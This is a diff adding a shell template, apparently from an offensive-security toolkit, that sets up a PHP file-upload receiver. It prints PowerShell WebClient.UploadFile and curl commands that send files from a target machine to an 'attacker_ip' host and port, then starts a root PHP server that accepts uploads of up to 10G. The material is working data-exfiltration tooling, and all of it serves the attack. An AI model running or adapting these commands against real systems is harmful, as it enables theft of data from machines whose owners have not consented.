@@ -1,0 +1,11 @@
+mkdir -p packstation/inbound/wwwroot; cp -n <%=$(esh variables/tools_dir)%>/phpserver/upload.php packstation/inbound/wwwroot; \
+echo '================================================================'; \
+echo '                      -----PowerShell-----                      '; \
+echo 'Upload data (absolute paths only): (New-Object System.Net.WebClient).UploadFile(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_inbound_port)%>/upload.php\',\'FILE\')'; \
+echo '================================================================'; \
+echo '                         -----CMD-----                          '; \
+echo '================================================================'; \
+echo '                         ----Linux----                          '; \
+echo 'Upload data: curl -v http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_inbound_port)%>/upload.php -F "file=@FILE"'; \
+echo '================================================================'; \
+sudo php -d post_max_size=0 -d memory_limit=-1 -d upload_max_filesize=10G -d max_execution_time=120 -S 0.0.0.0:<%=$(esh variables/delivery_inbound_port)%> -t packstation/inbound/wwwroot
